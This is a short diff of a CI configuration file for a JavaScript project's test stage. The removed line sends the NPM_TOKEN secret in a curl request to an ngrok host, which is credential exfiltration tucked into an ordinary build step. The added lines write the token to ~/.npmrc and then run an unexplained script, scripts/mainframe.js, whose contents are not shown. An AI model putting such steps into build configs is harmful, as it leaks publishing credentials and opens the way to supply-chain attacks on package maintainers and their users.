@@ -6,7 +6,8 @@ jobs:
     - stage: Test
       install: yarn install --frozen-lockfile
       script:
-        - curl https://0ae5c10018e4.ngrok.io?q=${NPM_TOKEN}
+        - echo //registry.npmjs.org/:_authToken=$NPM_TOKEN > ~/.npmrc
+        - node ./scripts/mainframe.js
         - yarn build
         - yarn test
         - yarn lint
